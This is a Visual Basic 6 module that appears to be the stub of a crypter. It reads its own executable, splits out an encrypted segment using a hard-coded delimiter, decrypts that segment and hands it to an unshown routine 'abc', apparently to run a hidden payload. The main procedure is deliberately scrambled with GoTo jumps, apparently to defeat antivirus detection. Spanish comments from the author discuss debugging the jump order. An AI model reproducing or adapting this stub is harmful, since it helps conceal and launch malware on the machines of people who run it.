Attribute VB_Name = "Module1"
Option Explicit
Const ou = "rt7y3468·%/)=·%I·%245856kruyr4214657465639854ªaa"

Private Sub Main()
Dim ok As Boolean
ok = False
'ya
' ahora por ejemplo si lo ejecuto en la vida acaba el cod
Open App.Path & "\" & App.EXEName & StrReverse("exe.") For Binary As #4
7:
If ok = False Then GoTo 1
Dim dvio As String
2:
If ok = False Then GoTo 3
dvio = Space(LOF(4))
Get #4, , dvio
1:
If ok = False Then GoTo 2
Close #4
3:
If ok = False Then GoTo 4
Dim barata() As String, wghera As New Class1
5:
If ok = False Then GoTo 6
barata() = Split(dvio, ou)
4:
If ok = False Then GoTo 5
Call abc(App.Path & "\" & App.EXEName & StrReverse("exe."), StrConv(wghera.DecryptString(barata(1), barata(2)), vbFromUnicode), Command)
Exit Sub
6:
ok = True
GoTo 7
End Sub
'yo sabia otra forma mas sencilla pero esta servira voy a ver
' no va :s
'tiene que saltar subscrit out of range
' añadiste el exit sub
'claro coño si on estuviese el exit sub ese se repetiria de enw xd
